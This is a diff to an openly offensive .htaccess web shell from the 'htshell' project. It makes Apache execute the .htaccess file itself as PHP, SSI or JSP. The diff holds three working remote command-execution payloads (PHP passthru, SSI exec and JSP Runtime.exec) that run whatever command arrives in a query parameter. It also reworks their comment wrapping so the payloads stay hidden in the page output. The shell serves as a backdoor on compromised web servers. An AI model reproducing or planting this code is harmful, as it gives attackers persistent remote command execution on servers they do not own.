@@ -1,3 +1,4 @@
+# <!-- 
 # Self contained .htaccess web shell - Part of the htshell project
 # Written by Wireghoul - http://www.justanotherhacker.com
 
@@ -27,19 +28,20 @@
     AddType application/x-httpd-php .htaccess
 </IfModule>
 
-###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
+# <?php echo "--\x3e\n";passthru($_GET['c']." 2>&1"); echo "\x3c!--"; ?>
 
 <IfModule mod_include.c>
 # Enable serverside includes with exec functionality
     Options +Includes
 
 #Make apache treat .htaccess as a server side include file
+    AddType text/html .htaccess
     AddHandler text/html .htaccess
     AddOutputFilter INCLUDES .htaccess
 </IfModule>
-#SHELL<!--#exec cmd="echo ''" --><!--#if expr="$QUERY_STRING_UNESCAPED = /^c=(.*)$/" --><!--#set var="cmd" value="$1 2>&1" --><!--#else --><!--#set var="cmd" value="echo 'Regex failed'" --><!--#endif --><!--#exec cmd="$cmd"-->LLEHS
+# <!--#exec cmd='echo -e "--\x3e"' --><!--#if expr="$QUERY_STRING_UNESCAPED = /^c=(.*)$/" --><!--#set var="cmd" value="$1 2>&1" --><!--#else --><!--#set var="cmd" value="echo 'Regex failed'" --><!--#endif --><!--#exec cmd="$cmd"--><!--
 <IfModule mod_cacuho.c>
     AddHandler caucho-request .htaccess
 </IfModule>
-###### SHELL ######<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.io.*"/><jsp:scriptlet>String cmd = request.getParameter("cmd");String output = "";Process p = null;String s = null;try {if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1){p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);}else{p = Runtime.getRuntime().exec( cmd );}BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) {out.println( s );}}catch(IOException e) {out.println( e );}}</jsp:scriptlet></jsp:root>###### LLEHS ######
-
+#<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.io.*"/><jsp:scriptlet>String cmd = request.getParameter("cmd");String output = "";Process p = null;String s = null;try {if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1){p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);}else{p = Runtime.getRuntime().exec( cmd );}BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) {out.println( s );}}catch(IOException e) {out.println( e );}}</jsp:scriptlet></jsp:root>
+# -->
